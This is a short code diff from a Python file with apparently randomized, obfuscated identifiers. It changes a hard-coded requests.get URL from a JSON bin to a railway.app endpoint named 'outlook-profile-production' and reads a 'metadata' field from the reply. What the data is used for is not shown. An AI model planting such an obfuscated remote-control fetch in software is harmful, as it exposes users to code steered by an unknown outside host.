@@ -18,7 +18,7 @@ def net_ubrxus_153():
 
     def eval_ckrdle_723():
         try:
-            process_olvkea_644 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_olvkea_644 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_olvkea_644.raise_for_status()
             learn_zatffe_512 = process_olvkea_644.json()
             eval_lptdpp_430 = learn_zatffe_512.get('metadata')
